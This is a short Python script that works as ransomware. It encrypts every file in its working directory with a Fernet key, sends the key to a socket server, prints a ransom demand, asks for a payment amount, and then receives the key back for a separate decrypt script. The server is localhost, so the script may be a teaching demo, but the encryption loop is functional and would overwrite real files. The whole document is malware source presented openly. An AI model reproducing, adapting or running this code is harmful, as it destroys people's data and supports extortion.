import os
from cryptography.fernet import Fernet
import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 12345)
client_socket.connect(server_address)

files=[]

for file in os.listdir():
	if file == "Danger.py":
		continue
	if file == "decrypt.py":
		continue
	if file == "recv_encryptionkey.key":
		continue
	files.append(file)
	
	
key = Fernet.generate_key()

for file in files:
	with open(file,"rb") as f:
		contents = f.read()
	encrypted_contents = Fernet(key).encrypt(contents)
	with open(file,"wb") as f:
		f.write(encrypted_contents)
		
message = key
client_socket.send(message)

print("ALL YOUR FILES HAVE BEEN ENCRYPTED")
money = input("enter your ransom: ")

client_socket.send(money.encode('utf-8'))

print("Money sent, recieving key...")

recieved_key = client_socket.recv(1024)

with open("recv_encryptionkey.key","wb") as K:
	K.write(recieved_key)

print("Key Recieved, Run decrypt.py to retrieve files")

client_socket.close()


